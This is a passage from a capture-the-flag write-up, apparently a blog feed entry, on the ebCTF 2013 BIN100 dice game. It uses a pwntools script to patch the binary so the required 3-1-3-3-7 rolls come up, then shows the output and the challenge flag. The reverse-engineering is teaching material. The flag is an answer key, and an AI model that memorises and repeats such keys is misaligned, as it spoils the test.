   0x080490dd &amp;lt;+1169&amp;gt;:  sub    edx,eax
   0x080490df &amp;lt;+1171&amp;gt;:  mov    eax,edx
   0x080490e1 &amp;lt;+1173&amp;gt;:  add    eax,eax
   0x080490e3 &amp;lt;+1175&amp;gt;:  add    eax,edx
   0x080490e5 &amp;lt;+1177&amp;gt;:  add    eax,eax
   0x080490e7 &amp;lt;+1179&amp;gt;:  mov    edx,ecx
   0x080490e9 &amp;lt;+1181&amp;gt;:  sub    edx,eax
   0x080490eb &amp;lt;+1183&amp;gt;:  lea    eax,[edx+0x1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Interestingly, these five blocks compare &lt;code&gt;EAX&lt;/code&gt; (contains random value for the dice face) with expected value at each instance. If the dice (or the random number generator) has &lt;code&gt;3-1-3-3-7&lt;/code&gt; values in sequence, we will get the flag.&lt;/p&gt;

&lt;p&gt;We can solve this by patching the first instruction of each block (&lt;code&gt;0x08048ee1&lt;/code&gt; in the above block) to load expected values into &lt;code&gt;EAX&lt;/code&gt; rather than random values. This can be done in Python using the awesome &lt;a href=&#34;https://github.com/Gallopsled/pwntools&#34;&gt;pwntools&lt;/a&gt; library as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python2

import sys
from pwn import *

e = ELF(&#39;bin100&#39;)

addrvals = {
  0x08048ee1: 0x03,
  0x080490ee: 0x01,
  0x080492fc: 0x03,
  0x080494ff: 0x03,
  0x08049744: 0x07
}
for addr, value in addrvals.iteritems():
  print &#34;0x%08x&#34; % (addr)
  e.write(addr, asm(&#34;mov DWORD PTR [esp+0x50], %s&#34; % (value), arch=&#34;i386&#34;))
  print disasm(e.read(addr-0xf, 32))
  print

e.save(&#39;bin100.patched&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We create a mapping of expected values and addresses where these need to be written. Executing this script will create a new patched file that should then give us the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./bin100.patched

[*] ebCTF 2013 - BIN100 - Dice Game
    To get the flag you will need to throw the correct numbers.

[*] You will first need to throw a three, press enter to throw a dice!

 -------
|       |
|   O   |
|       |
 -------

 -------
|     O |
|   O   |
| O     |
 -------

[*] You rolled a three! Good!

[*] Next you will need to throw a one, press enter to throw a dice!

 -------
|       |
|   O   |
|       |
 -------

[*] You rolled a one! Very nice!

[*] Next you will need to throw another three, press enter to throw a dice!

 -------
|       |
|   O   |
|       |
 -------

 -------
|     O |
|   O   |
| O     |
 -------

[*] You rolled a three! Awesome!

[*] Throw another three for me now, press enter to throw a dice!

 -------
|       |
|   O   |
|       |
 -------

 -------
|     O |
|   O   |
| O     |
 -------

[*] You rolled another three! Almost there now!

[*] The last character you need to roll is a seven....  (o_O)  Press enter to throw a dice!

 -------
|       |
|   O   |
|       |
 -------

 -------
| O   O |
| O O O |
| O   O |
 -------

[*] You rolled a seven, with a six sided dice! How awesome are you?!

[*] You rolled 3-1-3-3-7, what does that make you? ELEET! \o/
[*] Nice job, here is the flag: ebCTF{9a9689dbd47a1fd3fc0bf17d60edf545}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome! The flag for this challenge is &lt;strong&gt;ebCTF{9a9689dbd47a1fd3fc0bf17d60edf545}&lt;/strong&gt;. You can download the patched file &lt;a href=&#34;/static/files/bin100.patched&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
  </channel>
</rss>